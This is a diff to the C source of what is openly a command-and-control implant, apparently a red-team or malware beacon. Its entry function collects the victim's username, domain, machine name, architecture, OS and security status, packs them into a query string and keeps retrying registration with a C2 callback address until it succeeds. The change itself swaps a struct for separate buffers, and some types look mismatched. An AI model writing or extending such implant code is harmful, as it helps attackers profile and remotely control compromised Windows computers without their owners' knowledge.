@@ -22,18 +22,20 @@ void Entry()
     DWORD    dwSize   = 63;
     BOOL     retValue = TRUE;
     LPCWSTR  UriBuffer[MAX_PATH * 3];
-    struct   BasicUserInfo UserInfo;
+    CHAR     lpcUserName[256];
+    CHAR     lpcDomainName[256];
+    CHAR     lpcComputerName[256];
     struct   BasicCompInfo CompInfo;
 
     // collect basic info about the user
-    if (!GetBasicUserInfo(&UserInfo))
+    if (!GetBasicUserInfo(&lpcUserName, &lpcDomainName, &lpcComputerName))
     {
         // thats kind of a tuff one, we need this info to function and if we can't get this basic info straight up we cant follow the protocol properly.
         // let still callback to the C2 but lets just inform them of the error, via NULLs. therefore we still get to keep the session cause other stuff might work.
 
-        strcpy( UserInfo.UserName, "NULL" );
-        strcpy( UserInfo.DomainName, "NULL" );
-        strcpy( UserInfo.ComputerName, "NULL" );
+        strcpy(lpcUserName, "NULL");
+        strcpy(lpcDomainName, "NULL");
+        strcpy(lpcComputerName, "NULL");
     }
 
     // collect basic info about the computer
@@ -46,8 +48,8 @@ void Entry()
     }
 
     // format the data correctly so it can be used when we call back to the c2
-    sprintf(UriBuffer, "username=%s&domain=%s&machine=%s&arch=%s&os=%s&secure=%s", UserInfo.UserName, UserInfo.DomainName, UserInfo.ComputerName,
-                                                                                                      CompInfo.Arch, CompInfo.OS, CompInfo.Secure);
+    sprintf(UriBuffer, "username=%s&domain=%s&machine=%s&arch=%s&os=%s&secure=%s", lpcUserName, lpcDomainName, lpcComputerName,
+                                                                                   CompInfo.Arch, CompInfo.OS, CompInfo.Secure);
 
     // register back with the c2
     while (!BeaconRegisterC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, (LPCWSTR)UriBuffer, dwSize))
